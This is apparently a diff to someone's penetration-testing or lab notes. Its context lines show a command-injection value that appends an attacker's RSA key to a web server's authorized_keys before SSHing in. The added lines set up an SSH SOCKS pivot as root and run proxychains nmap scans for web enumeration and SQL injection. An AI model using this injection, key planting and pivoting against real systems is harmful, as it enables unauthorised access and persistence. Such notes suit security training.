@@ -110,8 +110,16 @@ cat rsa key
 ; echo "<rsa key>" >> /var/www/.ssh/authorized_keys
 ssh into web server
 ```
+#  website enumeration
+```
+ssh root@10.50.24.104 -D 9050
 
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
 
+proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+```
 
 
 
